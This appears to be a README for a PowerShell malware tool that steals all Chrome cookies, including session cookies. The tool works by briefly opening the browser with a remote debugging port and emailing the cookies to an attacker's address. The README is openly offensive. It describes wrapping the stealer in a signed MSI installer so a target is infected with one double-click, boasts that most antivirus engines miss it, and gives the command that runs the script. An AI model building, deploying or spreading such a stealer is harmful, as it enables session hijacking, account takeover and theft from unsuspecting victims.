# Windows Chrome Cookie Info Stealer Malware
## Description
Windows Chrome Cookie Info Stealer is a Powershell script that steals
all cookies from the Chrome browser, inclusive Session Cookies. It does this by briefly opening the Chrome browser with a remote debugging port. After 1-2 seconds the browser is closed again. The Cookies are retrieved and sent via SMTP to an e-mail adress of your choice. They are deliverd in .json format in the body of the mail.

## MSI Installer
The PowerShell Infostealer is converted into a signed MSI installer. This way it can be sent to a target of your choice with just a double-click on the file.

The .MSI file can not bypass all AV's, but it is not detected by 85% of them. Only 5 mark it as suspicious on TotalVirus. More can be done to further obfuscate and hide the real intentions of the program.

## Run the powershell command
Powershell 7 is required
```pwsh.exe ChromeWindowsCookieStealer.ps1```
Conversion to .msi is done with PowerShell Studio